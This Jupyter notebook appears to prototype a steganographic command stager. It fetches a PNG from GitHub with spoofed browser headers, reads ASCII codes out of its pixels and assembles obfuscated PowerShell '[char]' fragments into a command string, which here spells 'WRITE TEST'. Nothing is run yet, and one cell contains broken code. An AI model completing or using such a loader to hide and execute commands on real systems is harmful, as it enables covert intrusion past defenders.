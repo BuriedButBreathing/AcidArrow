{
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.0-final"
  },
  "orig_nbformat": 2,
  "kernelspec": {
   "name": "Python 3.9.0 64-bit",
   "display_name": "Python 3.9.0 64-bit",
   "metadata": {
    "interpreter": {
     "hash": "63fd5069d213b44bf678585dea6b12cceca9941eaf7f819626cde1f2670de90d"
    }
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2,
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "from PIL import Image\n",
    "import requests\n",
    "import io\n",
    "import platform\n",
    "import subprocess"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "# OS determination\n",
    "runningOS = platform.system().lower()\n",
    "detectedOS = \"\"\n",
    "if runningOS == \"linux\" or runningOS == \"linux2\":\n",
    "    exit\n",
    "elif runningOS == \"windows\":\n",
    "    detectedOS = \"windows\"\n",
    "elif runningOS == \"darwin\":\n",
    "    detectedOS = \"mac\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Dictionary of headers for Windows, Mac, and Linux\n",
    "headers_dict = {'windows':{\"Connection\": \"keep-alive\",\n",
    "        \"Upgrade-Insecure-Requests\": \"1\",\n",
    "        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36\",\n",
    "        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\",\n",
    "        \"Sec-Fetch-Site\": \"same-origin\",\n",
    "        \"Sec-Fetch-Mode\": \"navigate\",\n",
    "        \"Sec-Fetch-User\": \"?1\",\n",
    "        \"Sec-Fetch-Dest\": \"document\",\n",
    "        \"Referer\": \"https://www.google.com/\",\n",
    "        \"Accept-Encoding\": \"gzip, deflate, br\",\n",
    "        \"Accept-Language\": \"en-US,en;q=0.9\"},'darwin':{\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0\",\n",
    "        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\n",
    "        \"Accept-Language\": \"en-US,en;q=0.5\",\n",
    "        \"Referer\": \"https://www.google.com/\",\n",
    "        \"DNT\": \"1\",\n",
    "        \"Connection\": \"keep-alive\",\n",
    "        \"Upgrade-Insecure-Requests\": \"1\"},'linux':{\"User-Agent\": \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\",\n",
    "        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\n",
    "        \"Accept-Language\": \"en-US,en;q=0.5\",\n",
    "        \"Accept-Encoding\": \"gzip, deflate, br\",\n",
    "        \"Referer\": \"https://www.google.com/\",\n",
    "        \"DNT\": \"1\",\n",
    "        \"Connection\": \"keep-alive\",\n",
    "        \"Upgrade-Insecure-Requests\": \"1\"}}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "# User Agent Creation\n",
    "userAgent = headers_dict.get(runningOS)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Hash Table for Values Needed\n",
    "# Use system time as key for hash, ensure staggered requests so as to not flood web traffic with get requests to images\n",
    "while x value < y:\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "# Image Retrieval\n",
    "response = requests.get(\"https://github.com/BuriedButBreathing/AcidArrow/blob/master/Test.png?raw=true\", headers=userAgent)\n",
    "print(response)\n",
    "imageBytes = io.BytesIO(response.content)\n",
    "img = Image.open(imageBytes)\n",
    "imgData = list(img.getdata())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "[32, 34, 36, 39, 40, 41, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 93, 95, 123, 124, 125]\n"
     ]
    }
   ],
   "source": [
    "# Scrape values from Image\n",
    "usefulValues = []\n",
    "pixelValues = []\n",
    "for t in imgData:\n",
    "    for x in t:\n",
    "        pixelValues.append(x)\n",
    "for value in pixelValues:\n",
    "    if value < 126 and value != 0:\n",
    "        usefulValues.append(value)\n",
    "del usefulValues[-2:]\n",
    "print(usefulValues)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "Got all the values\n"
     ]
    }
   ],
   "source": [
    "# Verify Values\n",
    "if sum(usefulValues) != 3683:\n",
    "    print('Missing Values')\n",
    "else:\n",
    "    print('Got all the values')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Craft ASCII variables\n",
    "asciiList = []\n",
    "for i in usefulValues:\n",
    "    asciiList.append('[char]{}'.format(i))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "('[char]87', '[char]82', '[char]73', '[char]84', '[char]69', '[char]32', '[char]84', '[char]69', '[char]83', '[char]84')\n"
     ]
    }
   ],
   "source": [
    "# Build command\n",
    "newVar = asciiList[43], asciiList[38], asciiList[29], asciiList[40], asciiList[25], asciiList[0], asciiList[40], asciiList[25], asciiList[39], asciiList[40]\n",
    "print(newVar)"
   ]
  }
 ]
}